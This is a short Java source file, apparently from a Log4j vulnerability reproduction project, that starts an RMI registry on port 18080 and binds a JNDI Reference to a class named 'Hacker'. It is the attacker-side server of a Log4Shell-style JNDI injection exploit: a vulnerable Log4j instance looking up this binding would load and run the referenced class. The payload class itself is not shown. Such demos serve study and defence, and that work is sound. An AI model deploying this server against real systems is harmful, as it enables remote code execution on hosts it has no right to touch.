package com.itplh.log4j2;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RmiServer {
    public static void main(String[] args) throws Exception {
        Registry registry = LocateRegistry.createRegistry(18080);
        Reference reference = new Reference(null, Hacker.class.getName(), null);
        registry.bind("hello", new ReferenceWrapper(reference));
        System.out.println("rmi server start success...");
    }
}
